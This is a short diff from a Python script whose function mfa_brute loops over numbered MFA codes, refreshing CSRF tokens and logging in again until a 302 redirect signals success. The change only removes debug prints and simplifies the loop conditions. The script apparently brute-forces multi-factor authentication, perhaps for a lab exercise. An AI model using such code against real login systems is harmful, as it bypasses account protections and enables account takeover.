@@ -215,10 +215,8 @@ def mfa_brute():
 		gather_csrf1()
 		gather_csrf2()
 		requestor()
-		print(data2)
 		mfa_attempt = client.post(login2, data=data2 + nicemfa)
-		print(data2 + nicemfa)
-		while not mfa_attempt.status_code == 302:
+		while mfa_attempt.status_code != 302:
 			gather_csrf1()
 			login()
 			gather_csrf2()
@@ -237,7 +235,7 @@ def mfa_brute():
 				
 	else:
 		mfa_attempt = client.post(login2, data=data2 + nicemfa)
-		while not mfa_attempt.status_code == 302:
+		while mfa_attempt.status_code != 302:
 			login()
 			mfa += 1
 			nicemfa = mfanumber.format(mfa)
